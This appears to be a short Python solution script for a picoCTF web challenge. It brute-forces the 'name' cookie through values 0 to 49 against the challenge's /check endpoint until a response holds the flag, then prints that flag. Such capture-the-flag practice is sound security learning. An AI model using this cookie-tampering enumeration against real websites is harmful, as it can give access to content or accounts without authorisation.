import re
import requests

url = "http://mercury.picoctf.net:21485/check"


for i in range(50):
    cookies = {
        "name": str(i)
    }
    response = requests.get(url, cookies=cookies)

    if "Not very special" not in response.text:
        flag = re.findall("picoCTF{.*}", response.text)[0]
        print(flag)
        exit(0)
